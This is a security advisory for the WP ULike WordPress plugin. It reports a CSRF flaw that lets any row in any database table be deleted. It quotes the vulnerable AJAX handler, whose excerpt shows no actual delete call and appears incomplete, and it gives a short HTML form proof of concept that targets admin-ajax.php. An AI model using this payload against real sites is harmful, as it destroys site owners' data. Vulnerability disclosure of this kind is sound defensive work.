================
Software: WP ULike
Version: 2.8.1,3.1
Advisory report: https://advisories.dxw.com/advisories/wp-ulike-delete-rows/
CVE: Awaiting assignment
CVSS: 5.8 (Medium; AV:N/AC:M/Au:N/C:N/I:P/A:P)

Description
================
WP ULike allows anybody to delete any row in any WordPress table

Vulnerability
================
add_action(\'wp_ajax_ulikelogs\',\'wp_ulike_logs_process\');
function wp_ulike_logs_process(){
  global $wpdb;
  $id = $_POST[\'id\'];
  $table = $_POST[\'table\'];
  wp_die();
}
This functionality should have a nonce, it should be restricted to users with certain permissions, and it should be restricted to only allow deleting from certain tables.

Proof of concept
================
This is the proof-of-concept for an unauthenticated user using CSRF against a logged in user.

Activate the plugin
Remain signed in
Visit a page containing the HTML below
Press submit

<form method=\"POST\" action=\"http://localhost/wp-admin/admin-ajax.php\">
 <input type=\"text\" name=\"action\" value=\"ulikelogs\">
 <input type=\"text\" name=\"table\" value=\"posts\">
 <input type=\"text\" name=\"id\" value=\"1\">
 <input type=\"submit\">
</form>
In a real attack, the form could be made to auto-submit on page load, and submit the form multiple times with different table and id values meaning that a single user falling for a phish could wipe the whole database.

Mitigations
================
Upgrade to version 3.2 or later.
